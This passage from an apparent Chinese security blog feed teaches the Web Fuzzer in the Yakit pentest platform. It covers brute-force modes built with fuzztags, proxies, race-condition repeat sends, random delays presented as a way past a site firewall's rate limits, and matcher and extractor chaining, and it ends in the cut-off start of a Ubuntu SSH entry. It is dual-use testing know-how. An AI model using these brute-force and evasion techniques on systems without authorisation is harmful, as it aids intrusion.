bomb：多个参数同时爆破，使用不同字典，字典间做笛卡尔乘积模式。例如：<code>{"key": "§value§", "key2": "§value2§"}</code>，使用的第一个字典为<code>1,2</code>，第二个字典为<code>3,4</code>，则发送的包为：<code>{"key": "1", "key2": "3"}</code>，<code>{"key": "1", "key2": "4"}</code>，<code>{"key": "2", "key2": "3"}</code>，<code>{"key": "2", "key2": "4"}</code></li></ol><p> 根据上述的分析，我们可以看到爆破模式实际上主要服务于多个参数爆破且使用不同字典的情况，我们有没有更好的方式来替代爆破模式呢？答案是肯定的，我们依然可以使用fuzztag来实现。</p><ul><li>集束炸弹模式</li></ul><p>首先我们来看看多参数的情况下fuzztag的默认表现，实际上他是类似于Cluster bomb爆破模式：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.43.23.png" style="zoom:50%;"><p>可以看到一共发送了4个包，和Cluster bomb爆破模式一致。</p><ul><li>攻城槌模式</li></ul><p>那么我们要如何使用fuzztag来实现Battering ram爆破模式呢？我们只需要在每个参数的位置插入相同的fuzztag即可：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.46.18.png" style="zoom:50%;"><p>但是本质上仍然是集束炸弹模式。这里我觉得官方文档解释有错误。实际上应该是借助分组的方式来实现，像下面这样。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.48.14.png" alt="截屏2024-12-25 16.48.14" style="zoom:50%;"><ul><li>干草叉模式</li></ul><p>我们再来看看如何使用fuzztag实现Pitchfork爆破模式，这时候需要学习fuzztag的一个小小的新语法。我们知道fuzztag它大概长这个样子：<code>{{tagname(tagvalue)}}</code>，但实际上我们可以给他分组，就像这个样子：<code>{{tagname::1(tagvalue)}}</code>。</p><p>两个冒号后面的数字表示分组，分组的意思是：<strong>同一个分组的fuzztag会被替换为同一个 Index 的值</strong>。例如我们想要实现Pitchfork爆破模式，我们只需要在每个参数的位置插入fuzztag，并且在每个fuzztag后面加上相同的分组标识即可：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.51.54.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.54.03.png" style="zoom:50%;"><p>我们可以发现Burp suite的爆破模式并不是必须的，我们可以通过fuzztag加分组的方式来实现更加灵活的爆破模式。</p><h2 id="12-3-高级配置"><a href="#12-3-高级配置" class="headerlink" title="12.3 高级配置"></a>12.3 高级配置</h2><p>爆破时使用代理，或者我们需要在爆破时使用国密TLS等场景，这时候我们就需要对Web Fuzzer进行一些高级配置了。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.00.43.png" style="zoom:50%;"><h3 id="12-3-1-强制HTTPS"><a href="#12-3-1-强制HTTPS" class="headerlink" title="12.3.1 强制HTTPS"></a>12.3.1 强制HTTPS</h3><p>开启<strong>强制HTTPS</strong>选项，可以使得这次请求强制使用HTTPS协议而非HTTP协议进行通信，这在某些网站要求强制使用HTTPS时非常有用。</p><h3 id="12-3-2-国密TLS"><a href="#12-3-2-国密TLS" class="headerlink" title="12.3.2 国密TLS"></a>12.3.2 国密TLS</h3><p>开启<strong>国密TLS</strong>选项，可以使得这次请求使用国密TLS协议进行通信，可以在某些网站要求使用国密TLS进行通信时使用。</p><h3 id="12-3-3-真实Host"><a href="#12-3-3-真实Host" class="headerlink" title="12.3.3 真实Host"></a>12.3.3 真实Host</h3><p>我们知道，Web Fuzzer在默认情况下会从请求包中提取Host请求头来作为我们要通信目标，但是有时候我们需要手动指定Host请求头，这时候我们就可以填写<strong>真实Host</strong>，这样Web Fuzzer就会使用我们手动指定的真实Host来进行通信，这在Host碰撞的场景下非常有用。</p><h3 id="12-3-4-设置代理"><a href="#12-3-4-设置代理" class="headerlink" title="12.3.4 设置代理"></a>12.3.4 设置代理</h3><p>默认情况下，Web Fuzzer会走系统代理来进行发包。但是有时候我们需要手动指定代理，这时候我们就可以填写<strong>设置代理</strong>，这样Web Fuzzer就会使用我们手动指定的代理来进行通信，这在访问内网服务的场景下非常有用。在指定多个代理的情况下，Web Fuzzer会智能找到可用的代理进行请求。</p><h3 id="12-3-5-禁用系统代理"><a href="#12-3-5-禁用系统代理" class="headerlink" title="12.3.5 禁用系统代理"></a>12.3.5 禁用系统代理</h3><p>默认情况下，Web Fuzzer会走系统代理来进行发包。但是有时候我们不想使用系统代理，或者说这次发包不应该走系统代理，这时候我们就可以开启<strong>禁用系统代理</strong>选项。</p><h3 id="12-3-6-响应数量限制"><a href="#12-3-6-响应数量限制" class="headerlink" title="12.3.6 响应数量限制"></a>12.3.6 响应数量限制</h3><p>响应数量限制用于限制页面中最多渲染多少个请求响应，这个限制是由于请求响应过多时可能会对前端渲染造成一定的压力，所以需要对其进行限制。限制后如果想要查看所有响应，可以点击<strong>查看全部</strong>按钮：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.05.52.png" style="zoom:50%;"><h3 id="12-3-7-响应体长度限制"><a href="#12-3-7-响应体长度限制" class="headerlink" title="12.3.7 响应体长度限制"></a>12.3.7 响应体长度限制</h3><p>响应体长度限制用于限制页面中最多渲染的最长响应长度，这个限制是由于响应过大时可能会对前端渲染造成一定的压力，所以需要对其进行限制。当响应长度超过限制时，Web Fuzzer 会自动截断响应体，并显示超大响应，如果想要查看完整响应，可以点击<strong>完整响应</strong>按钮，在本地查看：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.10.38.png" style="zoom:50%;"><h2 id="12-4-请求包配置"><a href="#12-4-请求包配置" class="headerlink" title="12.4 请求包配置"></a>12.4 请求包配置</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.11.58.png" style="zoom:50%;"><h3 id="12-4-1-Fuzztag-辅助"><a href="#12-4-1-Fuzztag-辅助" class="headerlink" title="12.4.1 Fuzztag 辅助"></a>12.4.1 Fuzztag 辅助</h3><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.13.20.png" style="zoom:50%;"><p>这也是一个用于辅助我们构造 Fuzztag 的工具。我们可以选择一些基础fuzztag，然后对他进行修改，查看生成后的 payload ，并且还可以将其添加到<strong>插入标签</strong>悬浮框的常用标签中。</p><h3 id="12-4-2-渲染-Fuzz"><a href="#12-4-2-渲染-Fuzz" class="headerlink" title="12.4.2 渲染 Fuzz"></a>12.4.2 渲染 Fuzz</h3><p>默认情况下，<strong>渲染 Fuzz</strong>选项是打开并选中标准模式的。 三个模式的区别如下：</p><ol><li>关闭：关闭该选项之后，所有的 Fuzztag 就会失效。这在我们不需要Fuzz标签而且与某些模板引擎语法冲突的情况下非常有用。</li><li>标准：标准模式下，Web Fuzzer 会对请求包中的Fuzz标签进行渲染，每个 Fuzztag 必须严格符合<code>{{tagname1({{tagname2(param)}})}}</code>的格式。</li><li>兼容：兼容模式下，Web Fuzzer 会对请求包中的Fuzz标签进行渲染，在嵌套fuzztag的情况下，我们可以省略多余的花括号，例如：<code>{{tagname1(tagname2(param))}}</code>。</li></ol><h3 id="12-4-3-不修复长度"><a href="#12-4-3-不修复长度" class="headerlink" title="12.4.3 不修复长度"></a>12.4.3 不修复长度</h3><p>默认情况下，Web Fuzzer会对请求包进行一些修复，其中也会对<code>Content-Length</code>请求头进行修复。我们知道，在数据包完全正确的情况下，<code>Content-Length</code>请求头的值应该等于请求体的长度，但是一般情况下我们修改了请求体之后不可能手动去计算<code>Content-Length</code>的值，这时候Web Fuzzer就会自动修复<code>Content-Length</code>的值。但是有时候我们可能遇到HTTP走私的情况或者不希望Web Fuzzer修复长度，这时候我们就可以开启<strong>不修复长度</strong>选项。     </p><h3 id="12-4-4-超时时长"><a href="#12-4-4-超时时长" class="headerlink" title="12.4.4 超时时长"></a>12.4.4 超时时长</h3><p>即每个请求的超时时间，单位为秒。在请求超时时，Web Fuzzer会自动返回并提示请求超时的错误。</p><h3 id="12-4-5-批量目标"><a href="#12-4-5-批量目标" class="headerlink" title="12.4.5 批量目标"></a>12.4.5 批量目标</h3><p>批量目标在你要对多个目标进行测试时非常有用。我们可以通过手动输入或者上传文件的方式来指定多个目标，这些目标之间用英文逗号或换行符分隔：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.20.12.png" style="zoom:50%;"><h2 id="12-5-并发配置"><a href="#12-5-并发配置" class="headerlink" title="12.5 并发配置"></a>12.5 并发配置</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.21.48.png" style="zoom:50%;"><h3 id="12-5-1-重复发包"><a href="#12-5-1-重复发包" class="headerlink" title="12.5.1 重复发包"></a>12.5.1 重复发包</h3><p>重复发包一般用于测试条件竞争或者大并发的情况。填写<strong>重复发包</strong>的值（后续称之为n）后，Web Fuzzer会重复发包n次。这实际上也是通过添加了fuzztag标签实现的，其等价于在请求包的任意位置添加<code>{{repeat(n)}}</code>。</p><h3 id="12-5-2-并发线程"><a href="#12-5-2-并发线程" class="headerlink" title="12.5.2 并发线程"></a>12.5.2 并发线程</h3><p>在我们设置了fuzztag后，我们可能会发送不止一个数据包，此时我们可以通过填写<strong>并发线程</strong>的值控制用于并发的线程数量。这在我们需要进行快速并发测试或者请求网站的防火墙对访问速度有限制时非常有用。</p><h3 id="12-5-3-随机延迟"><a href="#12-5-3-随机延迟" class="headerlink" title="12.5.3 随机延迟"></a>12.5.3 随机延迟</h3><p>在我们并发请求网站的场景下，请求网站的防火墙可能会对访问速度有限制，此时我们可以通过设置<strong>随机延迟</strong>的Min和Max值，这样可以在每次请求之前延迟随机的时间（Min-Max秒），这可以在一定程度上通过请求网站的防火墙。</p><h2 id="12-6-重试配置"><a href="#12-6-重试配置" class="headerlink" title="12.6 重试配置"></a>12.6 重试配置</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.31.07.png" style="zoom:50%;"><h3 id="12-6-1-重试次数"><a href="#12-6-1-重试次数" class="headerlink" title="12.6.1 重试次数"></a>12.6.1 重试次数</h3><p>在网络请求中，我们不可避免会遇到许多网络连通性的问题，比如服务器负载过高导致服务端错误（502状态码）或者网络波动导致请求失败，此时我们可以通过设置<strong>重试次数</strong>的值来控制Web Fuzzer重试的次数，这可以在一定程度上提高请求的稳定性。</p><h3 id="12-6-2-重试条件"><a href="#12-6-2-重试条件" class="headerlink" title="12.6.2 重试条件"></a>12.6.2 重试条件</h3><p><strong>重试条件</strong>配合重试次数使用。我们可以通过填写<strong>重试条件</strong>中状态码的值，设置其在响应什么状态码时进行重试。例如我们填写了<code>502,503</code>，则当响应状态码为502或者503时，Web Fuzzer会进行重试。</p><h3 id="12-6-3-不重试条件"><a href="#12-6-3-不重试条件" class="headerlink" title="12.6.3 不重试条件"></a>12.6.3 不重试条件</h3><p><strong>不重试条件</strong>配合重试次数使用。我们可以通过填写<strong>不重试条件</strong>中状态码的值，设置其在响应什么状态码时不进行重试。例如我们填写了<code>200,302</code>，则当响应状态码为200或者302时，Web Fuzzer不会进行重试。</p><p>无论如何，Web Fuzzer不会对30x的响应状态码进行重试。</p><h2 id="12-7-重定向配置"><a href="#12-7-重定向配置" class="headerlink" title="12.7 重定向配置"></a>12.7 重定向配置</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.35.47.png" style="zoom:50%;"><h3 id="12-7-1-禁用重定向"><a href="#12-7-1-禁用重定向" class="headerlink" title="12.7.1 禁用重定向"></a>12.7.1 禁用重定向</h3><p>开启<strong>禁用重定向</strong>选项可以禁用请求时的自动重定向。这在我们需要测试重定向漏洞时非常有用。</p><h3 id="12-7-2-重定向次数"><a href="#12-7-2-重定向次数" class="headerlink" title="12.7.2 重定向次数"></a>12.7.2 重定向次数</h3><p><strong>重定向次数</strong>的值只有在关闭<strong>禁用重定向</strong>选项时生效。它表示的是在请求时最多允许重定向多少次。</p><h3 id="12-7-3-JS重定向"><a href="#12-7-3-JS重定向" class="headerlink" title="12.7.3 JS重定向"></a>12.7.3 JS重定向</h3><p>我们知道js一般通过调用<code>window.location.href</code>或者<code>window.location.replace</code>来进行页面的重定向。一般情况下这种重定向是无法跟踪的，这时候我们就需要开启<strong>JS重定向</strong>选项，来跟踪这种重定向。</p><h2 id="12-8-DNS配置"><a href="#12-8-DNS配置" class="headerlink" title="12.8 DNS配置"></a>12.8 DNS配置</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.39.30.png" style="zoom:50%;"><h3 id="12-8-1-DNS服务器配置"><a href="#12-8-1-DNS服务器配置" class="headerlink" title="12.8.1 DNS服务器配置"></a>12.8.1 DNS服务器配置</h3><p><strong>DNS服务器</strong>用于指定本次请求使用的DNS服务器。在默认情况下，Web Fuzzer会使用系统的DNS服务器，但是有时候我们需要手动指定DNS服务器，这时候我们就可以填写<strong>DNS服务器</strong>的值，这在访问一些内网服务时非常有用。</p><h3 id="12-8-2-Hosts配置"><a href="#12-8-2-Hosts配置" class="headerlink" title="12.8.2 Hosts配置"></a>12.8.2 Hosts配置</h3><p><strong>Hosts配置</strong>可以直接添加host到ip的映射。这在指定的dns服务器都无法正常工作的情况下非常有用。</p><h2 id="12-9-WebFuzzer序列"><a href="#12-9-WebFuzzer序列" class="headerlink" title="12.9 WebFuzzer序列"></a>12.9 WebFuzzer序列</h2><h3 id="12-9-1-相关高级配置"><a href="#12-9-1-相关高级配置" class="headerlink" title="12.9.1 相关高级配置"></a>12.9.1 相关高级配置</h3><h4 id="1）匹配器"><a href="#1）匹配器" class="headerlink" title="1）匹配器"></a>1）匹配器</h4><ul><li>基本了解</li></ul><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.35.15.png" style="zoom:50%;"><p>一共有三种匹配模式：<strong>丢弃，保留，仅匹配</strong>。这三个模式很好理解：</p><ol><li>丢弃：丢弃模式会在符合匹配器时下丢弃返回包。</li><li>保留：保留模式会在符合匹配器时保留返回包，剩余的返回包则直接丢弃。</li><li>仅匹配：仅匹配模式会在符合匹配器时将对应的返回包染色，而不做其他操作。</li></ol><p>在匹配模式的旁边，有一个<strong>红色的圈</strong>，这里实际上是颜色按钮，用于设置在仅匹配模式下的染色颜色。</p><p>再往右看，有两个二选一按钮：<strong>AND和OR</strong>。这两个按钮用于设置多个数据提取器的匹配逻辑，AND表示所有匹配器的条件都需要匹配，OR表示只需要有其中一个条件匹配即可。</p><ul><li>添加方法</li></ul><p>我们点击下方的添加按钮或者上图中右上角的添加/调试按钮，就可以添加匹配器了。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.41.23.png" style="zoom:50%;"><ul><li>使用方法</li></ul><p>匹配器给我们提供了多种匹配类型与匹配位置，方便我们编写复杂的匹配器。</p><p>匹配类型：</p><ol><li>关键字：关键字就是在匹配位置中匹配输入的关键字。</li><li>正则表达式：正则表达式就是在匹配位置中匹配输入的正则表达式。</li><li>状态码：（<strong>忽略匹配位置</strong>）状态码就是匹配响应的状态码，我们只需要填写希望匹配到的状态码即可。</li><li>十六进制：在某些情况下，希望匹配的字符串不是正常可见的ascii码，这时候你就可以使用十六进制这种匹配类型，输入十六进制字符串（例如字符串”302”对应十六进制字符串”333032”）。</li><li>表达式：（<strong>忽略匹配位置</strong>）表达式可以更加灵活地编写我们所希望的匹配规则，它还能与后续要讲的 高级配置：变量 联动。表达式的语法与nuclei-dsl语法兼容，熟悉nuclei工具的师傅可以尝试在表达式中编写一些复杂的匹配规则。一个匹配响应体中是否存在对应字符串的例子如下：<code>contains(body,'302 Found')</code>。</li></ol><p>匹配位置：（以下面这个响应包为例）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">HTTP/1.1 <span class="token number">302</span> FoundConnection: keep-aliveContent-Type: text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8Location: https://www.baidu.com/Content-Length: <span class="token number">154</span><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>body<span class="token operator">&gt;</span><span class="token number">302</span> Found<span class="token operator">&lt;</span>/body<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>状态码：匹配范围仅有状态码。</li><li>响应头：匹配范围包含响应的第一行（在例子是<code>HTTP/1.1 302 Found</code>）以及响应头。</li><li>响应体：匹配范围包含响应正文（在例子里是<code>&lt;html&gt;&lt;body&gt;302 Found&lt;/body&gt;&lt;/html&gt;</code>）。</li><li>全部响应：匹配范围即整个响应包。</li></ol><p>另外匹配器还包含**不匹配(取反)**这个选项，其意思是将匹配改为不匹配，这方便我们编写更复杂的匹配器。</p><h4 id="2）数据提取器"><a href="#2）数据提取器" class="headerlink" title="2）数据提取器"></a>2）数据提取器</h4><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.48.35.png" style="zoom:50%;"><p>数据提取器的功能是将响应包中的某些数据提取出来。</p><ul><li>添加数据提取器</li></ul><p>点击添加按钮即可</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.50.03.png" style="zoom:50%;"><p>数据提取器同样给我们提供了多种提取类型与提取位置，方便我们编写复杂的数据提取器。我们可以看到在数据提取器的左上角（data_0）旁边存在一个编写按钮，这是用于修改提取器的名字，这个名字可以在后续变量和Web Fuzzer序列中使用。</p><ul><li>提取类型</li></ul><ol><li>正则表达式：正则表达式就是在提取位置中提取输入的正则表达式匹配到的内容。我们知道在正则表达式中可以使用小括号来分组，这时候我们可以在<strong>匹配正则分组</strong>中选择分组，这样就可以提取到想要的内容了。(在正则表达式中,0分组即为正则表达式匹配到的所有内容)</li><li>XPath：（提取范围只能是<strong>响应体</strong>）XPath就是在提取位置中提取输入的XPath匹配到的内容。XPath是一种用于在XML文档中选择节点的语言，我们也可以很轻易地使用浏览器开发工具来复制完整的Xpath。</li><li>键值对：键值对的提取规则稍微有点复杂。键值对会尝试提取所有可能存在的json的key对应的value，以及所有形似<code>key=value</code>中value的值。如果提取位置包含响应头（提取范围为<strong>响应头</strong>或<strong>Raw</strong>），则他还会尝试提取响应头中的value值。另外还有两个特殊的键值对，分别为<code>proto</code>，<code>status_code</code>，分别对应响应的HTTP协议版本和响应状态码。</li><li>JQ(*)：（提取范围只能是<strong>响应体</strong>）jq是一种用于在JSON文档中选择节点的工具，其对应的文档教程<a href="https://jqlang.github.io/jq/manual/">在此</a>。</li><li>表达式：（<strong>忽略匹配位置</strong>）表达式与上面匹配器中的表达式相同，这里不再赘述。</li></ol><p>对于<strong>Xpath</strong>这种提取类型，我们以下面的例子做讲解：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.57.37.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.57.52.png" style="zoom:40%;"><p>在上述例子中，我们在最下面一行中填入xpath：<code>/html/body/div[1]/p[2]/a</code>，此时如果点击<strong>调试执行</strong>，我们就可以拿到对应的a标签内容：<code>More information...</code>。假如我们在上面的<strong>Xpath 参数</strong>中填入<code>href</code>，我们就可以提取到a标签的href属性：</p><p><code>https://www.iana.org/domains/example</code>。</p><p>对于<strong>JQ</strong>这种提取类型，我们以下面的例子做讲解：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.59.32.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.59.52.png" style="zoom:40%;"><p>在上述例子中，我们可以看到响应体是一段json。假如我们想提取headers中Content-Type的值，我们只需要使用<code>.headers.["Content-Type"]</code>即可。</p><h4 id="3）变量"><a href="#3）变量" class="headerlink" title="3）变量"></a>3）变量</h4><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.01.19.png" style="zoom:50%;"><p>在上述<strong>数据提取器</strong>小节中，我们提到数据提取器的名字可以在变量中使用，实际上就相当于我们赋值了一个变量。同样地，我们也可以直接在变量这个地方上直接赋值变量。</p><p>在上图中，我们可以设置变量名和变量值，变量可以在<strong>后续变量</strong>，<strong>Web Fuzzer序列</strong>和<strong>当前Web Fuzzer</strong>中使用。我们可以通过使用fuzztag：<code>{{params(变量名)}}</code>或<code>{{p(变量名)}}</code>来使用变量。</p><p>变量同样存在三种模式：<strong>nuclei</strong>，<strong>fuzztag</strong>，<strong>raw</strong>。</p><ol><li>nuclei：nuclei模式下，其变量值实际上是nuclei的表达式，可以调用绝大部分nuclei-dsl中包含的函数。需要注意的是，当你引用其他变量时，其的值都是string类型，所以可能需要手动进行类型转换。一个简单的例子如下：<code>{{int(a)+3}}</code>。</li><li>fuzztag：fuzzta模式下，其变量值实际上就是fuzztag，在值中使用fuzztag也会使得Web Fuzzer发送多个请求包。一个简单的例子如下：<code>{{int(1-2)}}</code>。</li><li>raw：raw模式下，变量值相当于你输入的字符串，不会被解析。</li></ol><h4 id="4）GET-参数-POST-参数-Cookie-Header"><a href="#4）GET-参数-POST-参数-Cookie-Header" class="headerlink" title="4）GET 参数 / POST 参数 / Cookie / Header"></a>4）GET 参数 / POST 参数 / Cookie / Header</h4><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.06.27.png" style="zoom:50%;"><p>这些配置放在一起讲解。设置了这些配置之后，Web Fuzzer会在发送请求包时添加对应的 GET 参数 / POST 参数 / Cookie / Header并且<strong>额外发送请求</strong>，每设置一个变量就会额外发送一次。</p><p>如果我们设置了 GET 参数变量:<code>a=b</code> 以及 Cookie: <code>c=d</code>，当我们点击发送请求时，一共发送了3个请求包，这三个请求包分别是：</p><ol><li>原始请求，没有应用任何参数变量。</li><li>应用了其中一个 GET 参数变量:<code>a=b</code>，额外发送了一个包含 GET 参数:<code>a=b</code>的请求。</li><li>应用了其中一个 Cookie 变量:<code>c=d</code>，额外发送了一个包含 Cookie:<code>c=d</code>的请求。</li></ol><p>同理，假如我们额外设置了一个 GET 参数变量:<code>e=f</code>，那么我们就会额外发送一个包含 GET 参数:<code>e=f</code>的请求。</p><ul><li>如果同一种参数设置了多个变量：如下</li></ul><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.10.38.png" style="zoom:50%;"><p>会发送三个请求包：</p><ol><li>GET /?a=b HTTP/1.1 </li><li>GET /?a=b&amp;c=d HTTP/1.1</li><li>GET / HTTP/1.1</li></ol><h3 id="12-9-2-Web-Fuzzer序列基础"><a href="#12-9-2-Web-Fuzzer序列基础" class="headerlink" title="12.9.2 Web Fuzzer序列基础"></a>12.9.2 Web Fuzzer序列基础</h3><p>Web Fuzzer 序列就是将多个 Web Fuzzer 节点串联起来，实现更复杂的逻辑与功能。例如我们需要先进行登录，然后再进行其他操作，这时候我们就可以使用 Web Fuzzer 序列功能。</p><p>Web Fuzzer序列如图所示，在最左侧有一个<strong>Fuzzer 序列</strong>按钮：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.13.30.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.15.35.png" style="zoom:50%;"><p>当我们点击 <code>Fuzzer 序列</code> 按钮时，会将 <code>WF-[1]</code>这个子标签页组成一个序列，变成如下所示：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.16.01.png" style="zoom:50%;"><p>随后我们可以在 <code>Step [0]</code> 这个节点中，添加 <code>Web Fuzzer</code> 的标签页<code>WF-[1]</code>，这相当于序列中设置第一个节点的请求包为<code>WF-[1]</code>。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.16.52.png" style="zoom:50%;"><p>我们还可以继续添加其他节点到序列中，只需要将其他标签页拖入序列中即可：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.17.50.png" style="zoom:50%;"><p>接着我们在 <code>WF-[1]</code> 中设置一个提取器规则，规则内容是提取键值为<code>Node1</code>的值，声明为 <code>get</code>变量。再设置一个变量 <code>node1</code>，内容是<code>我是节点1传来的值</code>：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.19.16.png" style="zoom:50%;"><p>然后我们在 <code>WF-[2]</code>中设置<code>WF-[1]</code>中声明的变量，假如此时我们直接发送请求，结果会为空，这是因为单独发送这一个请求，是没有<code>WF-[1]</code>中声明的变量的：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.20.00.png" alt="截屏2024-12-26 11.20.00" style="zoom:50%;"><p>最后我们使用 <code>Fuzzer</code> 序列功能尝试一下，在<code> WF-[1]</code>到<code>WF-[2]</code>的中间，开启<strong>继承变量</strong>选项(默认开启)，点击<code>开始执行</code>按钮，等待请求结束后，我们查看<code>WF-[2]</code>的响应，发现它已经成功使用了在<code>WF-[1]</code>中设置的变量：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.22.22.png" style="zoom:50%;"><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ul><li><a href="https://yaklang.com/products/intro">https://yaklang.com/products/intro</a> 【官方文档】</li></ul>]]></content>
      
      
      <categories>
          
          <category> 攻防工具库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防工具库 </tag>
            
            <tag> Yakit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu开启ssh服务</title>
      <link href="/2024/12/23/xi-tong-yun-wei/ubuntu-kai-qi-ssh-fu-wu/"/>
      <url>/2024/12/23/xi-tong-yun-wei/ubuntu-kai-qi-ssh-fu-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="一、SSH简介"><a href="#一、SSH简介" class="headerlink" title="一、SSH简介"></a>一、SSH简介</h1><p>SSH（Secure Shell）是一种网络协议，用于在网络上的计算机之间加密数据传输，特别是远程登录和管理。以下是SSH服务的一些基本介绍：</p><ol><li><strong>加密通信</strong>：SSH提供了一个安全的通道，通过这个通道，数据传输过程中可以防止窃听和中间人攻击，确保数据的机密性和完整性。</li><li><strong>远程登录</strong>：用户可以通过SSH协议远程登录到服务器，执行命令和操作，就像直接在服务器上操作一样。</li><li><strong>端口转发</strong>：SSH支持端口转发功能，可以将本地端口转发到远程服务器，实现安全的数据传输。</li><li><strong>密钥认证</strong>：SSH支持基于密钥的认证机制，提供比传统的用户名和密码更安全的认证方式。</li><li><strong>命令执行</strong>：通过SSH，用户可以在远程服务器上执行命令，进行文件传输，以及管理服务和进程。</li><li><strong>安全性</strong>：SSH协议使用公钥加密技术，确保只有拥有正确密钥的用户才能访问服务器。</li><li><strong>兼容性</strong>：SSH客户端和服务器软件广泛支持多种操作系统，包括Linux、Unix、Windows等。</li><li><strong>配置管理</strong>：SSH常用于自动化脚本和配置管理工具，如Ansible、Puppet等，以安全地管理和部署服务器配置。</li><li><strong>隧道和VPN</strong>：SSH可以作为VPN的一种形式，创建安全的网络隧道，允许通过不安全的网络传输敏感数据。</li><li><s